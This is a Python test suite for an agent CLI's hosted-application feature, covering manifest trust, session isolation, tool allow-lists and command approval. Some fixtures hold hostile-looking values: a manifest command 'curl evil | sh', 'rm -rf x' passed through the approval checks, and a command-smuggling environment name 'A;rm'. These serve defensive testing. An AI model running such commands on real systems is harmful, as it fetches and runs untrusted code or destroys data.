"""Applications hosted in their own sub-terminal: /helpwo and /app.

The properties pinned here are the ones the design depends on:
  * a persistent application keeps every id the browser and the agent key
    their data by, and a non-persistent one keeps none of them;
  * the parent never mistakes an earlier launch's runtime report for this one;
  * trusted applications expose the authenticated runtime APIs;
  * the main terminal launches a sub-terminal instead of serving Helpwo itself.
"""
import io
import json
import os
import shlex
import socket
import sys
import tempfile
import threading
import time
import unittest
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from types import SimpleNamespace
from unittest import mock
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from rich.console import Console

import agent_persistence
import app_host
import helpwo_server
import laintas_cli
import paths


class _Home(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = Path(self._tmp.name) / "home"
        self.home.mkdir()
        self.work = Path(self._tmp.name) / "work"
        self.work.mkdir()
        patcher = mock.patch.object(paths, "LAINTAS_HOME", self.home)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.addCleanup(self._tmp.cleanup)


class LaunchStateTests(_Home):
    def test_persistent_state_is_identical_across_launches(self):
        _, first = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        app_host.update_state(app_host.state_dir("helpwo", str(self.work)), port=4321)
        _, second = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        for key in ("token", "local_agent_id", "conversation_id", "terminal_id"):
            self.assertEqual(first[key], second[key], key)
        self.assertEqual(second["port"], 4321)

    def test_each_folder_has_its_own_state(self):
        other = Path(self._tmp.name) / "other"
        other.mkdir()
        _, a = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        _, b = app_host.ensure_state("helpwo", str(other), persistent=True)
        self.assertNotEqual(a["token"], b["token"])
        self.assertNotEqual(a["conversation_id"], b["conversation_id"])

    def test_non_persistent_state_is_fresh_every_launch(self):
        _, first = app_host.ensure_state("demo", str(self.work), persistent=False)
        _, second = app_host.ensure_state("demo", str(self.work), persistent=False)
        for key in ("token", "local_agent_id", "conversation_id"):
            self.assertNotEqual(first[key], second[key], key)

    def test_switching_to_persistent_does_not_inherit_throwaway_ids(self):
        _, throwaway = app_host.ensure_state("demo", str(self.work), persistent=False)
        _, kept = app_host.ensure_state("demo", str(self.work), persistent=True)
        self.assertNotEqual(throwaway["token"], kept["token"])

    def test_state_file_is_private(self):
        directory, _ = app_host.ensure_state("helpwo", str(self.work), persistent=True)
        mode = os.stat(directory / "state.json").st_mode & 0o777
        self.assertEqual(mode, 0o600)


class RuntimeHandshakeTests(_Home):
    def test_a_report_from_an_earlier_launch_is_ignored(self):
        directory = app_host.state_dir("helpwo", str(self.work))
        app_host.write_runtime(directory, "old", status="ready", url="http://stale")
        result = app_host.wait_runtime(directory, "new", timeout=0.3, poll=0.05)
        self.assertEqual(result["status"], "timeout")

    def test_the_matching_report_is_returned(self):
        directory = app_host.state_dir("helpwo", str(self.work))

        def later():
            time.sleep(0.1)
            app_host.write_runtime(directory, "new", status="ready", url="http://ok")

        threading.Thread(target=later).start()
        result = app_host.wait_runtime(directory, "new", timeout=3, poll=0.02)
        self.assertEqual(result["url"], "http://ok")

    def test_a_dead_process_ends_the_wait(self):
        directory = app_host.state_dir("helpwo", str(self.work))
        result = app_host.wait_runtime(directory, "x", timeout=5, alive=lambda: False)
        self.assertEqual(result["status"], "exited")


class ManifestTests(_Home):
    def _write(self, directory, name, data):
        directory.mkdir(parents=True, exist_ok=True)
        (directory / f"{name}.json").write_text(json.dumps(data), encoding="utf-8")

    def test_valid_manifest_parses(self):
        manifest, reason = app_host.parse_manifest(
            {"name": "notes", "command": "node s.js", "persistence": "workspace"}, "/x.json")
        self.assertEqual(reason, "")
        self.assertEqual(manifest.persistence, "workspace")

    def test_invalid_manifests_are_refused_with_a_reason(self):
        cases = [
            {"name": "helpwo"},
            {"name": "Bad Name"},
            {"name": "ok", "persistence": "forever"},
            {"name": "ok", "port": 70000},
            {"name": "ok", "shell": True},
            {"name": "ok", "prompt": 3},
            {"name": "ok", "session_tools": ["unknown.tool"]},
            {"name": "ok", "session_tools": "shell.exec"},
            {"name": "ok", "auto_approve": "yes"},
            {"name": "ok", "max_sessions": 0},
            {"name": "ok", "session_idle_minutes": -1},
        ]
        for data in cases:
            with self.subTest(data=data):
                manifest, reason = app_host.parse_manifest(data, "/x.json")
                self.assertIsNone(manifest)
                self.assertTrue(reason)

    def test_project_manifest_shadows_user_manifest_and_problems_are_reported(self):
        self._write(app_host.user_manifest_dir(), "notes", {"name": "notes", "description": "user"})
        self._write(app_host.project_manifest_dir(str(self.work)), "notes",
                    {"name": "notes", "description": "project"})
        (app_host.user_manifest_dir() / "broken.json").write_text("{", encoding="utf-8")
        found, problems = app_host.discover_manifests(str(self.work))
        self.assertEqual(found["notes"].description, "project")
        self.assertEqual(found["notes"].scope, "project")
        self.assertEqual(len(problems), 1)

    def test_trust_is_lost_when_the_manifest_changes(self):
        directory = app_host.user_manifest_dir()
        self._write(directory, "notes", {"name": "notes", "command": "true"})
        manifest = app_host.discover_manifests(str(self.work))[0]["notes"]
        self.assertFalse(app_host.is_trusted(manifest))
        app_host.trust(manifest)
        self.assertTrue(app_host.is_trusted(manifest))
        self._write(directory, "notes", {"name": "notes", "command": "curl evil | sh"})
        changed = app_host.discover_manifests(str(self.work))[0]["notes"]
        self.assertFalse(app_host.is_trusted(changed))
        self.assertTrue(app_host.revoke("notes"))
        self.assertFalse(app_host.revoke("notes"))


class SessionManifestTests(unittest.TestCase):
    def test_defaults_are_shell_only_with_interactive_approvals(self):
        manifest, _ = app_host.parse_manifest({"name": "notes"}, "/x.json")
        self.assertEqual(manifest.session_tools, ["shell.exec"])
        self.assertFalse(manifest.auto_approve)
        self.assertEqual(manifest.max_sessions, 10)

    def test_the_bridge_accepts_approval_responses(self):
        self.assertIn("approval-response", app_host.APP_ALLOWED_KINDS)
        self.assertIn("approval-response", app_host.SESSION_ALLOWED_KINDS)
        self.assertNotIn("session-open", app_host.SESSION_ALLOWED_KINDS)


class SessionDirTests(_Home):
    def test_persistent_user_folders_are_stable_and_throwaway_ones_are_not(self):
        state = self.home / "state"
        home1, work1 = app_host.session_dirs(state, "alice", persistent=True)
        home2, _ = app_host.session_dirs(state, "alice", persistent=True)
        self.assertEqual(home1, home2)
        t1, _ = app_host.session_dirs(state, "alice", persistent=False)
        t2, _ = app_host.session_dirs(state, "alice", persistent=False)
        self.assertNotEqual(t1, t2)
        self.assertTrue(work1.is_dir())

    def test_throwaway_folders_are_removed_and_persistent_ones_kept(self):
        state = self.home / "state"
        kept, _ = app_host.session_dirs(state, "alice", persistent=True)
        gone, _ = app_host.session_dirs(state, "bob", persistent=False)
        app_host.remove_session_dir(kept)
        app_host.remove_session_dir(gone)
        self.assertTrue(kept.exists())
        self.assertFalse(gone.parent.exists())

    def test_only_login_and_backends_are_shared_with_a_session(self):
        (self.home / "session.json").write_text("{}", encoding="utf-8")
        (self.home / "memory").mkdir()
        (self.home / "memory" / "secret.md").write_text("operator", encoding="utf-8")
        home, _ = app_host.session_dirs(self.home / "state", "alice", persistent=True)
        app_host.link_credentials(home)
        self.assertTrue((home / "session.json").is_symlink())
        self.assertFalse((home / "memory").exists())


class PromptSectionTests(unittest.TestCase):
    def tearDown(self):
        app_host._active = None

    def test_no_section_in_an_ordinary_process(self):
        app_host._active = None
        self.assertEqual(app_host.render_prompt_section(), "")

    def test_helpwo_section_uses_its_own_prompt(self):
        app_host.activate("helpwo", app_host.HELPWO_AGENT_PROMPT, builtin=True)
        section = app_host.render_prompt_section()
        self.assertIn('name="helpwo"', section)
        self.assertIn("Helpwo web app", section)

    def test_manifest_prompt_is_attributed_to_its_author(self):
        app_host.activate("notes", "Summarise notes.", builtin=False)
        section = app_host.render_prompt_section()
        self.assertIn("written by its author", section)
        self.assertIn("Summarise notes.", section)


class ConversationAliasTests(unittest.TestCase):
    def test_primary_is_saved_under_the_application_conversation(self):
        with tempfile.TemporaryDirectory() as raw, \
                mock.patch.object(agent_persistence, "AGENTS_DIR", Path(raw)):
            agent = SimpleNamespace(id="primary", name="primary",
                                    chat_history=[{"role": "user", "content": "hi"}],
                                    state={}, profile=None, active_assignment=None,
                                    assignment_history=[])
            agent_persistence.set_storage_alias("primary", "app-helpwo-abc")
            try:
                self.assertTrue(agent_persistence.save_agent_state(agent))
                self.assertTrue((Path(raw) / "app-helpwo-abc.json").exists())
                self.assertFalse((Path(raw) / "primary.json").exists())
                loaded = agent_persistence.load_agent_state("primary")
                self.assertEqual(loaded["chat_history"][0]["content"], "hi")
            finally:
                agent_persistence.set_storage_alias("primary", None)
            self.assertIsNone(agent_persistence.load_agent_state("primary"))


class _OfflineRegistry:
    REMOTE_CONTROL_KINDS = frozenset({"abort", "approval-response", "disconnect", "term-close"})

    def __init__(self):
        self.agent_id = None
        self.agent_name = "app"
        self.parent_remote_id = None
        self.terminal_meta = None
        self._state_cb = None
        self._chat_cb = None
        self._remote_executor = ThreadPoolExecutor(max_workers=1)
        self._remote_control_executor = ThreadPoolExecutor(max_workers=1)
        self._remote_capacity_lock = threading.Condition(threading.RLock())
        self._remote_accepted = {"task": 0, "control": 0}
        self.received = []
        self._push_events = lambda events, req_id=None: None

    def _reserve_remote_capacity(self, control):
        return True

    def _run_bounded_remote(self, message, *_args):
        self.received.append(message)

    def close(self):
        self._remote_executor.shutdown(wait=True)
        self._remote_control_executor.shutdown(wait=True)


class AppBridgeTests(unittest.TestCase):
    def setUp(self):
        self.registry = _OfflineRegistry()
        self._cwd = os.getcwd()
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.addCleanup(self.registry.close)
        self.addCleanup(os.chdir, self._cwd)
        self.addCleanup(helpwo_server.stop_server)
        os.chdir(self._tmp.name)
        with socket.socket() as sock:
            sock.bind(("127.0.0.1", 0))
            port = sock.getsockname()[1]
        ok, msg = helpwo_server.start_server(
            self.registry, port=port, session={}, token="tok",
            agent_id="local-notes-abc",
            app_profile={"name": "notes", "allowed_kinds": app_host.APP_ALLOWED_KINDS})
        self.assertTrue(ok, msg)
        self.base = f"http://127.0.0.1:{port}"
        self.auth = {"Authorization": "token tok"}

    def _post(self, path, body):
        return urlopen(Request(self.base + path, data=json.dumps(body).encode(),
                               headers={**self.auth, "Content-Type": "application/json"},
                               method="POST"), timeout=2)

    def test_the_agent_is_listed_under_its_stable_id(self):
        agents = json.load(urlopen(Request(self.base + "/api/agents", headers=self.auth), timeout=2))
        self.assertEqual(agents[0]["id"], "local-notes-abc")
        self.assertEqual(agents[0]["app"], "notes")

    def test_chat_is_accepted(self):
        reply = json.load(self._post("/api/agents/local-notes-abc/send",
                                     {"kind": "chat", "reqId": "r1", "payload": {"message": "hi"}}))
        self.assertTrue(reply["ok"])

    def test_exec_and_approval_responses_are_accepted(self):
        for kind in ("exec", "approval-response", "term-new"):
            reply = json.load(self._post("/api/agents/local-notes-abc/send",
                {"kind": kind, "reqId": kind, "payload": {}}))
            self.assertTrue(reply["ok"])

    def test_files_and_runtime_routes_are_available(self):
        for path in ("/api/local-fs/root", "/api/local-runtime"):
            with urlopen(Request(self.base + path, headers=self.auth), timeout=2) as response:
                self.assertEqual(response.status, 200)
        with self.assertRaises(HTTPError) as refused:
            urlopen(Request(self.base + "/index.html", headers=self.auth), timeout=2)
        self.assertEqual(refused.exception.code, 503)

    def test_files_still_require_the_token(self):
        with self.assertRaises(HTTPError) as refused:
            urlopen(self.base + "/api/local-fs/root", timeout=2)
        self.assertEqual(refused.exception.code, 403)

    def test_auto_approval_applies_to_local_exec(self):
        from types import SimpleNamespace
        self.registry.app_mode = {"approval": "auto"}
        policy = SimpleNamespace(evaluate=lambda *a, **k: SimpleNamespace(action="needs_approval"))
        with mock.patch("local_runtime._policy_modules", return_value=(policy, lambda key: False)):
            response = self._post("/api/local-exec", {"reqId": "auto-exec", "cmd": "printf app-ok"})
            with response:
                frames = [json.loads(line[6:]) for line in response.read().decode().splitlines()
                          if line.startswith("data: ")]
        self.assertFalse(any(x.get("t") == "approval" for x in frames))
        self.assertEqual(frames[-1]["status"], "success")
        self.assertIn("app-ok", json.dumps(frames))

    def test_auto_approval_does_not_override_policy_deny(self):
        self.registry.app_mode = {"approval": "auto"}
        policy = SimpleNamespace(evaluate=lambda *a, **k: SimpleNamespace(action="deny", reason="test deny"))
        with mock.patch("local_runtime._policy_modules", return_value=(policy, lambda key: False)):
            with self._post("/api/local-exec", {"reqId": "deny-exec", "cmd": "printf should-not-run"}) as response:
                result = response.read().decode()
        self.assertIn("Blocked by policy", result)
        self.assertNotIn('"t": "start"', result)

    def test_the_token_is_still_required(self):
        with self.assertRaises(HTTPError) as refused:
            urlopen(self.base + "/api/agents", timeout=2)
        self.assertEqual(refused.exception.code, 403)


@unittest.skipUnless(os.name == "posix", "process groups")
class AppProcessTests(_Home):
    def test_stop_ends_the_whole_process_group(self):
        log = self.home / "app.log"
        proc = app_host.spawn_app_process(
            "sleep 30 & echo $LAINTAS_APP_NAME; wait", cwd=str(self.work),
            env_extra={"LAINTAS_APP_NAME": "notes"}, log_path=log)
        deadline = time.time() + 3
        while time.time() < deadline and "notes" not in (log.read_text() if log.exists() else ""):
            time.sleep(0.05)
        self.assertIn("notes", log.read_text())
        app_host.stop_app_processes(timeout=3)
        self.assertIsNotNone(proc.poll())
        # The backgrounded sleep is reparented when its shell dies; give init
        # a moment to reap it before asking whether the group is empty.
        deadline = time.time() + 3
        while time.time() < deadline:
            try:
                os.killpg(proc.pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        with self.assertRaises(ProcessLookupError):
            os.killpg(proc.pid, 0)


class AppModeRegistryTests(unittest.TestCase):
    def _registry(self, approval):
        registry = laintas_cli.AgentRegistry.__new__(laintas_cli.AgentRegistry)
        registry.app_mode = {"approval": approval}
        registry.pushed = []
        registry._push_events = lambda events, req_id=None: registry.pushed.extend(events)
        registry._push_final = lambda req_id, status, summary, **k: registry.pushed.append(
            {"type": "final", "status": status, "summary": summary})
        return registry

    def test_refused_without_waiting_for_anyone(self):
        registry = self._registry("deny")
        self.assertEqual(registry._request_approval("r", "rm -rf x", "/"), "reject")

    def test_auto_approves_including_destructive_operations(self):
        registry = self._registry("auto")
        self.assertEqual(registry._request_approval("r", "make", "/"), "approve")
        self.assertEqual(registry._request_approval("r", "rm -rf x", "/", destructive=True),
                         "approve")

    def test_interactive_approval_can_complete_via_bridge_response(self):
        registry = self._registry("ask")
        registry._active_req_lock = threading.Lock()
        registry._pending_approvals = {}
        def events(items, req_id=None):
            for item in items:
                if item["type"] == "needs-approval":
                    registry._handle_approval_response("reply", {
                        "targetReqId": req_id, "decision": "approve"})
        registry._push_events = events
        with mock.patch("mode_manager.get_auto_confirm_timeout", return_value=None), _Capture():
            self.assertEqual(registry._request_approval("r", "make", "/", timeout=0.1), "approve")
        self.assertEqual(registry._pending_approvals, {})

    def test_a_slash_message_is_not_run_as_a_command(self):
        registry = self._registry("deny")
        with _Capture(), \
                mock.patch.object(laintas_cli, "_inject_input") as injected, \
                mock.patch.object(laintas_cli, "get_agent", return_value=None), \
                mock.patch.object(laintas_cli, "run_agent_loop",
                                  return_value={"success": True, "msg": "ok"}) as loop:
            registry._chat_run_lock = threading.Lock()
            registry._active_req_lock = threading.Lock()
            registry._active_requests = {}
            registry._session = {}
            registry._build_loop_deps = lambda req_id: None
            registry._handle_chat("r1", {"message": "/policy disabled"}, None, lambda: [])
        injected.assert_not_called()
        self.assertEqual(loop.call_args.kwargs["original_input"], "/policy disabled")

    def test_session_kinds_are_refused_outside_a_hosted_application(self):
        registry = self._registry("deny")
        registry.app_mode = None
        registry._processing_message = threading.Event()
        with _Capture(), mock.patch.dict(laintas_cli._HOSTED_APP, {}, clear=True):
            registry._handle_remote_message(
                {"reqId": "r", "kind": "session-open", "payload": {"user": "a"}}, None, None)
        self.assertEqual(registry.pushed[-1]["status"], "fail")


class SessionCommandTests(unittest.TestCase):
    def test_frozen_child_runs_binary_without_a_script_argument(self):
        with mock.patch.object(laintas_cli.sys, "frozen", True, create=True), \
                mock.patch.object(laintas_cli.sys, "executable", "/opt/laintas cli"):
            args = shlex.split(laintas_cli._build_connected_subterminal_cmd(
                "helpwo", extra_args=["--app", "helpwo"]))
        self.assertEqual(args[1:4], ["/opt/laintas cli", "--depth", "1"])
        self.assertEqual(args[-2:], ["--app", "helpwo"])
        self.assertNotIn(laintas_cli._LAUNCH_SCRIPT_PATH, args)

    def test_source_child_runs_script_with_python(self):
        with mock.patch.object(laintas_cli.sys, "frozen", False, create=True), \
                mock.patch.object(laintas_cli.sys, "executable", "/opt/venv/bin/python"), \
                mock.patch.object(laintas_cli, "_LAUNCH_SCRIPT_PATH", "/src/cli project/laintas_cli.py"):
            args = shlex.split(laintas_cli._build_connected_subterminal_cmd("helpwo"))
        self.assertEqual(args[1:5], ["/opt/venv/bin/python",
                                   "/src/cli project/laintas_cli.py", "--depth", "1"])

    def test_session_command_carries_its_own_home_folder_and_depth(self):
        command = laintas_cli._build_connected_subterminal_cmd(
            "notes.u.alice", None, terminal_id="app-notes-x", depth=2,
            env={"LAINTAS_HOME": "/tmp/h o"}, cwd="/tmp/w",
            extra_args=["--app", "notes"])
        self.assertTrue(command.startswith("cd -- /tmp/w && "))
        self.assertIn("LAINTAS_HOME='/tmp/h o'", command)
        self.assertIn("--depth 2", command)

    def test_bad_environment_names_are_refused(self):
        with self.assertRaises(ValueError):
            laintas_cli._build_connected_subterminal_cmd("x", None, env={"A;rm": "1"})

    def test_session_agent_sees_only_its_allowed_tools(self):
        import agent_loop
        agent = agent_loop.register_agent(name="app-tool-probe", role="pool")
        try:
            agent.profile.tool_policy = agent_loop.AgentToolPolicy(
                allowed_tools=sorted(app_host.SESSION_BASE_TOOLS | {"shell.exec"}))
            names = agent_loop._allowed_tool_names_for_state({}, agent.id)
        finally:
            agent_loop.unregister_agent(agent.id)
        self.assertIn("shell.exec", names)
        for forbidden in ("fs.write", "agent.spawn", "mem.read", "terminal.send", "browser.open"):
            self.assertNotIn(forbidden, names)


class SessionManagerTests(_Home):
    def setUp(self):
        super().setUp()
        self.addCleanup(laintas_cli._APP_SESSIONS.clear)
        hosted = mock.patch.dict(laintas_cli._HOSTED_APP,
                                 {"state_dir": self.home / "state"}, clear=True)
        hosted.start()
        self.addCleanup(hosted.stop)
        self.manifest, _ = app_host.parse_manifest(
            {"name": "notes", "max_sessions": 2}, "/x.json")
        self.spawned = []

        def spawn(name, app, directory, state, options, **kw):
            self.spawned.append((name, options, kw))
            launch_id = f"L{len(self.spawned)}"
            app_host.write_runtime(directory, launch_id, status="ready",
                                   url="http://127.0.0.1:9", token=state["token"],
                                   agent_id=state["local_agent_id"])
            return object(), launch_id

        for target, value in (("_spawn_app_terminal", spawn),
                              ("_app_session_alive", lambda record: True),
                              ("get_terminal", lambda name: None),
                              ("unregister_terminal", lambda name: True)):
            patcher = mock.patch.object(laintas_cli, target, side_effect=value)
            patcher.start()
            self.addCleanup(patcher.stop)

    def test_each_user_gets_a_distinct_session_and_reopen_returns_the_same(self):
        with _Capture():
            alice = laintas_cli._app_session_open(self.manifest, "alice")
            bob = laintas_cli._app_session_open(self.manifest, "bob")
            again = laintas_cli._app_session_open(self.manifest, "alice")
        self.assertEqual(len(self.spawned), 2)
        self.assertNotEqual(alice["token"], bob["token"])
        self.assertNotEqual(alice["agentId"], bob["agentId"])
        self.assertEqual(alice, again)
        name, options, kw = self.spawned[0]
        self.assertEqual(name, "notes.u.alice")
        self.assertEqual(options["tools"], ["shell.exec"])
        self.assertFalse(options["auto_approve"])
        self.assertFalse(kw["use_tmux"])
        homes = {kw["env"]["LAINTAS_HOME"] for _n, _o, kw in self.spawned}
        self.assertEqual(len(homes), 2)

    def test_the_session_limit_holds(self):
        with _Capture():
            laintas_cli._app_session_open(self.manifest, "a")
            laintas_cli._app_session_open(self.manifest, "b")
            with self.assertRaises(RuntimeError):
                laintas_cli._app_session_open(self.manifest, "c")
            self.assertTrue(laintas_cli._app_session_close("a"))
            laintas_cli._app_session_open(self.manifest, "c")


class _Capture:
    def __enter__(self):
        self.buffer = io.StringIO()
        self._old = laintas_cli.console
        laintas_cli.console = Console(file=self.buffer, force_terminal=False, width=200)
        return self

    def __exit__(self, *exc):
        laintas_cli.console = self._old

    @property
    def text(self):
        return self.buffer.getvalue()


class CommandTests(_Home):
    def setUp(self):
        super().setUp()
        self._cwd = os.getcwd()
        os.chdir(self.work)
        self.addCleanup(os.chdir, self._cwd)
        self.addCleanup(laintas_cli._APP_LAUNCHES.clear)
        self.addCleanup(laintas_cli._HOSTED_APP.clear)
        depth = mock.patch.object(laintas_cli, "_REPL_PROCESS_DEPTH", 0)
        depth.start()
        self.addCleanup(depth.stop)

    def test_helpwo_in_the_main_terminal_launches_a_persistent_sub_terminal(self):
        registry = mock.Mock(agent_id="host-1", workspace_path=None)
        with _Capture(), \
                mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch, \
                mock.patch("helpwo_server.start_server") as start:
            laintas_cli._cmd_helpwo("--port 9000", ["/helpwo", "--port", "9000"], registry, {})
        start.assert_not_called()
        launch.assert_called_once()
        args, kwargs = launch.call_args
        self.assertEqual(args[0], "helpwo")
        self.assertTrue(kwargs["persistent"])
        self.assertEqual(kwargs["options"]["port"], 9000)

    def test_helpwo_inside_a_sub_terminal_serves_in_place(self):
        registry = mock.Mock(agent_id=None, workspace_path=None)
        with _Capture(), \
                mock.patch.object(laintas_cli, "_REPL_PROCESS_DEPTH", 1), \
                mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch, \
                mock.patch.object(laintas_cli, "_helpwo_start_in_process") as here:
            laintas_cli._cmd_helpwo("", ["/helpwo"], registry, {})
        launch.assert_not_called()
        here.assert_called_once()

    def test_launch_builds_an_app_sub_terminal_and_reports_readiness(self):
        started = []

        class _Sub:
            def __init__(self, command, **_kw):
                self.command = command
                started.append(command)

            def start(self):
                pass

            def is_alive(self):
                return True

            def read_output(self, timeout=0):
                return ""

            def close(self):
                pass

        registered = {}

        def _register(sub, command, depth, name=None, parent_terminal=None):
            registered.update(command=command, name=name)
            directory = app_host.state_dir("helpwo", str(self.work))
            launch_id = sub.command.split("--app-launch-id ")[1].split(" ")[0]
            app_host.write_runtime(directory, launch_id, status="ready",
                                   url="http://127.0.0.1:1", open_url="http://127.0.0.1:1/?token=t")
            return name

        with _Capture() as out, \
                mock.patch.object(laintas_cli, "SubTerminalSession", _Sub), \
                mock.patch.object(laintas_cli, "register_terminal", side_effect=_register), \
                mock.patch.object(laintas_cli, "get_terminal", return_value=None), \
                mock.patch.object(laintas_cli, "_open_external_url") as opened, \
                mock.patch.object(laintas_cli, "_can_open_graphical_browser", return_value=True), \
                mock.patch.object(laintas_cli.time, "sleep"):
            runtime = laintas_cli._launch_app_subterminal(
                "helpwo", persistent=True, options={"remote": False},
                agent_registry=mock.Mock(agent_id="host-1"), open_url=True, wait=True)
        self.assertEqual(runtime["status"], "ready")
        self.assertEqual(registered, {"command": "laintas-cli app:helpwo", "name": "helpwo"})
        command = started[0]
        for fragment in ("--depth 1", "--terminal-name helpwo", "--app helpwo",
                         "--remote-parent-id host-1", "LAINTAS_TERMINAL_ID=app-helpwo-"):
            self.assertIn(fragment, command)
        opened.assert_called_once_with("http://127.0.0.1:1/?token=t")
        self.assertIn("running in sub-terminal", out.text)

    def test_an_early_exit_reports_its_code_and_last_output(self):
        sub = mock.Mock(returncode=2,
                        full_output="\x1b[31mTraceback (most recent call last):\x1b[0m\r\n"
                                    "SyntaxError: bad\r\n")
        details = laintas_cli._subterminal_exit_details(sub)
        self.assertEqual(details["returncode"], 2)
        self.assertIn("SyntaxError: bad", details["output_tail"])
        self.assertNotIn("\x1b", details["output_tail"])
        with _Capture() as out:
            laintas_cli._report_app_runtime("helpwo", {"status": "exited", **details},
                                            open_url=False)
        self.assertIn("exit code 2", out.text)
        self.assertIn("SyntaxError: bad", out.text)

    def test_no_console_browser_is_started_without_a_display(self):
        runtime = {"status": "ready", "open_url": "http://127.0.0.1:1/?token=t"}
        with _Capture(), \
                mock.patch.dict(os.environ, {}, clear=True), \
                mock.patch.object(laintas_cli.sys, "platform", "linux"), \
                mock.patch.object(laintas_cli, "_open_external_url") as opened:
            laintas_cli._report_app_runtime("helpwo", runtime, open_url=True)
        opened.assert_not_called()

    def test_a_users_terminal_with_the_same_name_is_not_taken_over(self):
        existing = mock.Mock(command="bash", session=mock.Mock(is_alive=lambda: True))
        with _Capture() as out, \
                mock.patch.object(laintas_cli, "get_terminal", return_value=existing), \
                mock.patch.object(laintas_cli, "SubTerminalSession") as sub:
            result = laintas_cli._launch_app_subterminal(
                "helpwo", persistent=True, options={}, agent_registry=None, open_url=False)
        self.assertIsNone(result)
        sub.assert_not_called()
        self.assertIn("already exists", out.text)

    def test_helpwo_stop_closes_only_its_own_sub_terminal(self):
        with _Capture() as out, \
                mock.patch.object(laintas_cli, "get_terminal",
                                  return_value=mock.Mock(command="laintas-cli app:helpwo")), \
                mock.patch.object(laintas_cli, "unregister_terminal") as unregister, \
                mock.patch("helpwo_server.is_running", return_value=False):
            laintas_cli._cmd_helpwo("stop", ["/helpwo", "stop"], mock.Mock(agent_id=None), {})
        unregister.assert_called_once_with("helpwo")
        self.assertIn("sub-terminal closed", out.text)

    def test_app_start_refuses_an_untrusted_manifest(self):
        directory = app_host.user_manifest_dir()
        directory.mkdir(parents=True)
        (directory / "notes.json").write_text(json.dumps({"name": "notes"}), encoding="utf-8")
        with _Capture() as out, \
                mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch:
            laintas_cli._cmd_app(["/app", "start", "notes"], mock.Mock())
        launch.assert_not_called()
        self.assertIn("not trusted", out.text)

    def test_app_start_launches_a_trusted_manifest_with_its_persistence(self):
        directory = app_host.user_manifest_dir()
        directory.mkdir(parents=True)
        (directory / "notes.json").write_text(
            json.dumps({"name": "notes", "persistence": "workspace"}), encoding="utf-8")
        app_host.trust(app_host.discover_manifests(str(self.work))[0]["notes"])
        with _Capture(), mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch:
            laintas_cli._cmd_app(["/app", "start", "notes"], mock.Mock())
        launch.assert_called_once()
        self.assertTrue(launch.call_args.kwargs["persistent"])

    def test_app_refers_helpwo_to_its_own_command(self):
        with _Capture() as out, mock.patch.object(laintas_cli, "_launch_app_subterminal") as launch:
            laintas_cli._cmd_app(["/app", "start", "helpwo"], mock.Mock())
        launch.assert_not_called()
        self.assertIn("/helpwo", out.text)

    def test_argument_contracts(self):
        for command in ("/app", "/app list", "/app start notes", "/app trust notes"):
            with self.subTest(command=command):
                action, _raw, parts = laintas_cli._parse_slash_command(command)
                laintas_cli._validate_slash_args(action, parts[1:])
        action, _raw, parts = laintas_cli._parse_slash_command("/app start notes extra")
        with self.assertRaises(Exception):
            laintas_cli._validate_slash_args(action, parts[1:])


if __name__ == "__main__":
    unittest.main()


class HelpwoEnvironmentRegistrationTests(unittest.TestCase):
    """The Helpwo app sub-terminal goes online as a runtime environment.

    Helpwo files every agent that carries `terminal` under the terminal dock
    and keeps it out of the runtime-environment picker, so the sub-terminal
    behind the main terminal's /helpwo --remote must register the way a
    kernel does: a workspace, no terminal identity, no parent.
    """

    def _payload(self, as_environment: bool) -> dict:
        import laintas_cli
        registry = laintas_cli.AgentRegistry()
        registry.depth = 1
        registry.parent_remote_id = "parent-agent"
        registry.terminal_meta = {"name": "helpwo", "command": "laintas-cli",
                                  "createdAt": 0, "createdBy": "term0"}
        registry.as_environment = as_environment
        registry.workspace_path = "/srv/project"
        response = mock.Mock(status_code=200)
        response.json.return_value = {"agentId": "a1", "agentSecret": "s1"}
        try:
            with mock.patch.object(laintas_cli.requests, "post",
                                   return_value=response) as post:
                self.assertTrue(registry.register({"userId": "u1"}, quiet=True))
            return post.call_args.kwargs["json"]
        finally:
            registry._remote_executor.shutdown(wait=False, cancel_futures=True)
            registry._remote_control_executor.shutdown(wait=False, cancel_futures=True)

    def test_environment_registers_without_terminal_identity(self):
        payload = self._payload(as_environment=True)
        self.assertNotIn("terminal", payload)
        self.assertNotIn("parentId", payload)
        self.assertEqual(payload["workspacePath"], "/srv/project")

    def test_ordinary_sub_terminal_still_registers_as_terminal(self):
        payload = self._payload(as_environment=False)
        self.assertEqual(payload["terminal"]["name"], "helpwo")
        self.assertEqual(payload["parentId"], "parent-agent")


class SubterminalGracefulExitTests(unittest.TestCase):
    def test_waits_for_a_slow_sigterm_handler(self):
        """The nested CLI unregisters from Helpwo inside its SIGTERM handler;
        closing must not SIGKILL it before that finishes."""
        import subprocess
        import laintas_cli
        marker = Path(tempfile.mkdtemp()) / "unregistered"
        script = (
            "import signal, sys, time\n"
            "def h(*_):\n"
            "    time.sleep(1.5)\n"
            f"    open({str(marker)!r}, 'w').write('ok')\n"
            "    sys.exit(0)\n"
            "signal.signal(signal.SIGTERM, h)\n"
            "print('ready', flush=True)\n"
            "time.sleep(60)\n")
        proc = subprocess.Popen([sys.executable, "-c", script], stdout=subprocess.PIPE)
        try:
            proc.stdout.readline()
            sess = SimpleNamespace(pid=proc.pid, is_alive=lambda: proc.poll() is None)
            laintas_cli._let_subterminal_exit(sess, timeout=8.0)
            self.assertIsNotNone(proc.poll())
            self.assertTrue(marker.exists())
        finally:
            if proc.poll() is None:
                proc.kill()
            proc.wait()
